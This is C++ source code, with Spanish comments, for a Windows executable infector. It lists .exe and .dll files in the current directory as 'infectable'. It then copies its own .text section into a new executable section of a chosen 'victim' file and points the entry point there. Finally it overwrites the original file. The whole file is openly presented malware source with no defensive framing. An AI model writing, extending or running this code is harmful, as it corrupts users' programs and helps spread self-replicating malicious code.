#include <iostream>
#include <fstream>
#include <string> // Asegúrate de incluir esto
#include <windows.h>
#include <vector>
#include <filesystem>
#pragma pack(push, 1)
namespace fs = std::filesystem;
// Función auxiliar para verificar si una cadena termina con un sufijo
bool endsWith(const std::string& str, const std::string& suffix) {
    if (str.length() < suffix.length()) {
        return false;
    }
    return str.compare(str.length() - suffix.length(), suffix.length(), suffix) == 0;
}
void PrintOptionalHeader(const IMAGE_NT_HEADERS64& ntHeaders) {
    const IMAGE_OPTIONAL_HEADER64& optionalHeader = ntHeaders.OptionalHeader;
    // Imprimir otros campos si es necesario
}

void ModifyEntryPoint(IMAGE_NT_HEADERS64& ntHeaders, DWORD newEntryPointRVA);

struct PEHeader {
    IMAGE_DOS_HEADER dosHeader;
    IMAGE_NT_HEADERS64 ntHeaders;
};

#pragma pack(pop)

void PrintError(const char* message) {
    std::cerr << message << std::endl;
    exit(EXIT_FAILURE);
}

DWORD GetTextSectionRVA(const std::string& filePath, DWORD& textSectionSize) {
    std::ifstream file(filePath, std::ios::binary);
    if (!file) {
        PrintError("Cannot open file");
    }

    IMAGE_DOS_HEADER dosHeader;
    file.read(reinterpret_cast<char*>(&dosHeader), sizeof(IMAGE_DOS_HEADER));
    if (!file) {
        PrintError("Error reading DOS header");
    }

    file.seekg(dosHeader.e_lfanew, std::ios::beg);
    IMAGE_NT_HEADERS ntHeaders;
    file.read(reinterpret_cast<char*>(&ntHeaders), sizeof(IMAGE_NT_HEADERS));
    if (!file) {
        PrintError("Error reading PE header");
    }

    std::vector<IMAGE_SECTION_HEADER> sections(ntHeaders.FileHeader.NumberOfSections);
    file.read(reinterpret_cast<char*>(sections.data()), sizeof(IMAGE_SECTION_HEADER) * ntHeaders.FileHeader.NumberOfSections);
    if (!file) {
        PrintError("Error reading section headers");
    }

    for (int i = 0; i < ntHeaders.FileHeader.NumberOfSections; ++i) {
        if (strcmp(reinterpret_cast<const char*>(sections[i].Name), ".text") == 0) {
            textSectionSize = sections[i].Misc.VirtualSize;
            return sections[i].PointerToRawData; // Devuelve el offset físico en el archivo
        }
    }

    PrintError(".text section not found");
    return 0;
}

void InjectSelf(const std::string& victimFilePath, const std::string& outputFilePath, const char* selfCode, size_t selfCodeSize) {
    std::cout << "From InjectSelf: Victim file path is : " << victimFilePath
        << " Output file path is : " << outputFilePath
        << " Self-code size: " << selfCodeSize << std::endl;

    std::ifstream file(victimFilePath, std::ios::binary);
    if (!file) {
        PrintError("Cannot open victim file");
    }

    file.seekg(0, std::ios::end);
    size_t fileSize = file.tellg();
    file.seekg(0, std::ios::beg);
    std::vector<char> fileData(fileSize);
    file.read(fileData.data(), fileSize);
    if (!file) {
        PrintError("Error reading PE file");
    }

    IMAGE_DOS_HEADER dosHeader;
    std::memcpy(&dosHeader, fileData.data(), sizeof(IMAGE_DOS_HEADER));

    IMAGE_NT_HEADERS64 ntHeaders;
    std::memcpy(&ntHeaders, fileData.data() + dosHeader.e_lfanew, sizeof(IMAGE_NT_HEADERS64));

    IMAGE_FILE_HEADER& fileHeader = ntHeaders.FileHeader;
    IMAGE_OPTIONAL_HEADER64& optionalHeader = ntHeaders.OptionalHeader;
    IMAGE_SECTION_HEADER* sections = reinterpret_cast<IMAGE_SECTION_HEADER*>(fileData.data() + dosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS64));

    if (fileHeader.NumberOfSections < 1) {
        PrintError("Invalid PE file: No sections found");
    }

    IMAGE_SECTION_HEADER& lastSection = sections[fileHeader.NumberOfSections - 1];
    DWORD newSectionVirtualAddress = lastSection.VirtualAddress + ((lastSection.Misc.VirtualSize + optionalHeader.SectionAlignment - 1) & ~(optionalHeader.SectionAlignment - 1));
    DWORD newSectionPointerToRawData = lastSection.PointerToRawData + ((lastSection.SizeOfRawData + optionalHeader.FileAlignment - 1) & ~(optionalHeader.FileAlignment - 1));

    size_t newFileSize = newSectionPointerToRawData + ((selfCodeSize + optionalHeader.FileAlignment - 1) & ~(optionalHeader.FileAlignment - 1));
    fileData.resize(newFileSize);

    IMAGE_SECTION_HEADER newSection = {};
    strncpy_s(reinterpret_cast<char*>(newSection.Name), sizeof(newSection.Name), ".self", _TRUNCATE);
    newSection.Misc.VirtualSize = (selfCodeSize + optionalHeader.SectionAlignment - 1) & ~(optionalHeader.SectionAlignment - 1);
    newSection.VirtualAddress = newSectionVirtualAddress;
    newSection.SizeOfRawData = (selfCodeSize + optionalHeader.FileAlignment - 1) & ~(optionalHeader.FileAlignment - 1);
    newSection.PointerToRawData = newSectionPointerToRawData;
    newSection.Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE;

    std::memcpy(fileData.data() + dosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS64) + sizeof(IMAGE_SECTION_HEADER) * fileHeader.NumberOfSections, &newSection, sizeof(newSection));
    fileHeader.NumberOfSections++;
    optionalHeader.SizeOfImage = newSection.VirtualAddress + newSection.Misc.VirtualSize;

    DWORD sizeOfHeaders = dosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS64) + sizeof(IMAGE_SECTION_HEADER) * fileHeader.NumberOfSections;
    sizeOfHeaders = (sizeOfHeaders + optionalHeader.FileAlignment - 1) & ~(optionalHeader.FileAlignment - 1);
    optionalHeader.SizeOfHeaders = sizeOfHeaders;

    std::memcpy(fileData.data() + newSection.PointerToRawData, selfCode, selfCodeSize);

    optionalHeader.AddressOfEntryPoint = newSection.VirtualAddress;

    std::memcpy(fileData.data() + dosHeader.e_lfanew, &ntHeaders, sizeof(IMAGE_NT_HEADERS64));
    std::memcpy(fileData.data(), &dosHeader, sizeof(IMAGE_DOS_HEADER));

    std::ofstream outFile(outputFilePath, std::ios::binary);
    if (!outFile) {
        PrintError("Cannot open output file");
    }
    outFile.write(fileData.data(), fileData.size());
    std::cout << "Self-code injected and entry point modified successfully." << std::endl;
}

std::vector<std::string> FindInfectableFiles(const std::string& directory, const std::string& nameFilter, size_t sizeFilter) {
    std::vector<std::string> infectableFiles;

    for (const auto& entry : std::filesystem::directory_iterator(directory)) {
        if (entry.is_regular_file()) {
            const std::string& filePath = entry.path().string();
            const auto fileSize = entry.file_size();

            // Filtrar por extensión, nombre y tamaño
            if ((endsWith(filePath,".exe") || endsWith(filePath,".dll")) &&
                (nameFilter.empty() || filePath.find(nameFilter) != std::string::npos) &&
                (sizeFilter == 0 || fileSize <= sizeFilter)) {
                infectableFiles.push_back(filePath);
            }
        }
    }
    return infectableFiles;
}

void WriteReport(const std::vector<std::string>& files, const std::string& reportFilePath) {
    std::ofstream reportFile(reportFilePath);
    if (!reportFile) {
        PrintError("Cannot open report file");
    }

    for (const auto& file : files) {
        reportFile << file << std::endl;
    }

    reportFile.close();
    std::cout << "Report written to " << reportFilePath << std::endl;
}

int main(int argc, char* argv[]) {
    std::string nameFilter;
    size_t sizeFilter = 0;
    std::string reportFilePath = "report.txt"; // Ruta del archivo de reportes

    // Procesar argumentos
    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "-name" && (i + 1) < argc) {
            nameFilter = argv[++i];
        }
        else if (arg == "-size" && (i + 1) < argc) {
            sizeFilter = std::stoul(argv[++i]);
        }
    }

    // Obtener la ruta del directorio actual
    std::string currentDirectory = std::filesystem::current_path().string();
    std::cout << "Searching for infectable files in: " << currentDirectory << std::endl;

    // Buscar archivos infectables
    auto infectableFiles = FindInfectableFiles(currentDirectory, nameFilter, sizeFilter);
    if (infectableFiles.empty()) {
        std::cout << "No infectable files found in the current directory." << std::endl;
        return EXIT_SUCCESS;
    }

    // Escribir el reporte
    WriteReport(infectableFiles, reportFilePath);

    std::cout << "Infectable files found:" << std::endl;
    for (size_t i = 0; i < infectableFiles.size(); ++i) {
        std::cout << i + 1 << ": " << infectableFiles[i] << std::endl;
    }

    // Seleccionar un archivo para inyectar
    int choice;
    std::cout << "Select a file to infect (1-" << infectableFiles.size() << "): ";
    std::cin >> choice;

    if (choice < 1 || choice > infectableFiles.size()) {
        std::cerr << "Invalid choice." << std::endl;
        return EXIT_FAILURE;
    }

    std::string victimFilePath = infectableFiles[choice - 1];

    // Aquí puedes definir la ruta del archivo de salida
    std::string outputFilePath = victimFilePath; // Cambiar según necesites

    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);

    DWORD textSectionSize = 0;
    DWORD textSectionOffset = GetTextSectionRVA(selfPath, textSectionSize);

    std::ifstream selfFile(selfPath, std::ios::binary);
    if (!selfFile) {
        PrintError("Cannot open self file");
    }

    selfFile.seekg(textSectionOffset, std::ios::beg);
    std::vector<char> selfCode(textSectionSize);
    selfFile.read(selfCode.data(), textSectionSize);
    selfFile.close();

    InjectSelf(victimFilePath, outputFilePath, selfCode.data(), selfCode.size());

    system("pause");
    return 0;
}